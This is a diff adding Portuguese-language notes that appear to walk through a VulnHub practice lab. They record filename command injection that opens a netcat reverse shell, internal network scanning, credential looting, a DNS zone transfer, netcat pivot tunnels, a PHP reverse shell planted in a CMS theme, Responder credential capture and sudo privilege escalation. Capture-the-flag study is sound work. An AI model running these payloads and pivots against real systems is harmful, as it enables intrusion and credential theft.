@@ -1204,3 +1204,127 @@ Desafio 26 - - https://www.vulnhub.com/entry/tempus-fugit-1,346/ </br>
 				/usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
 			
 				root
+
+
+<h3>Dia 26 			2/10/2020</h3>
+
+	*browser -> ip_vm
+		menu -> upload
+			*burp
+			upload!
+				------WebKitFormBoundary5YBXXbBFZisCAb4E
+				Content-Disposition: form-data; name="file"; filename=""
+				Content-Type: application/octet-stream
+
+					*filename="testebeco.txt; cat main*"
+					
+					#info: b232a4da4c104798be4613ab76d26efda1a04606 
+							  someuser
+					
+					converter ip_kali para long decimal
+						https://www.smartconversion.com/unit_conversion/IP_Address_Converter.aspx
+						
+						kali: nc -lnvp 443
+						
+						filename="testebeco.txt; nc decimal_ip 443 -e sh"
+							filename="testebeco.txt; nc 3232261142 443 -e sh"
+						
+				*nc
+					python -c 'import pty;pty.spawn("/bin/bash")' 
+					
+					cat /root/message.txt
+					
+					cat /etc/resolv.conf
+						#mofo.pwn
+						
+					netstat -antp
+						#172.19.0.10...
+						
+						
+						fazer um scan na rede interno hosts/ports
+						ip descobertos	
+							172.19.0.1
+								22-80-8080
+							172.19.0.10
+								80
+							172.19.0.12
+								21
+							172.19.0.100	
+								53
+						
+						
+						*lftp someuser@172.19.0.12
+							b232a4da4c104798be4613ab76d26efda1a04606
+							
+							cat cmscreds.txt
+								#hardEnough4u
+							
+						
+						*dig axfr mofo.pwn -> transferencia de zona -> instalar dig na máquina
+							#ourcms.mofo.pwn
+							#
+							
+							
+	
+						kali:
+						 cd /tmp
+						mknod backpipe p 
+							nc -lvp 9091 0<backpipe|nc -lvp  9090 |tee backpipe
+							
+						*nc: 
+						cd /tmp
+						mknod backpipe p 
+						nc 172.19.0.1 8080 0<backpipe|nc ip_kali 9091 |tee backpipe
+						
+						kali 					->				host			-> alvo interno
+					porta local 9090	->---|                       -> 	
+					tunelamento 9091	->    |------------------ ->	 porta 8080
+	
+	
+					
+				
+					kali: nano /etc/hosts
+						ip_kali 	ourcms.mofo.pwn
+						
+
+
+						ip_kali:9090						
+						http://ourcms.mofo.pwn:9090/admin
+						
+							admin
+							hardEnough4u
+	
+					
+					*ourCMS
+						Theme		
+							<?php exec("/bin/bash -c ‘bash -i >& /dev/tcp/192.168.100.22/4040 0>&1’");?>
+							save
+							editing file: xxx
+							
+							*kali: nc -nlvp 4040
+							ourcms.pwn:9090/theme/Innovation/template.php
+													
+							*kali-------------
+								*sudo wireshark
+									#MDSN							
+							
+							 responder -I eth1 
+							user: channa
+							pass: 
+							-------------------
+							
+							su channa
+							pass:  
+							
+							cd /var/mail
+							cat channa
+								genna:9t4lw0r82rg1
+								
+							su genna
+							9t4lw0r82rg1
+												
+								sudo -l
+									#cpulimit							
+									
+									sudo cpulimit -l 100 -f /bin/sh
+									root
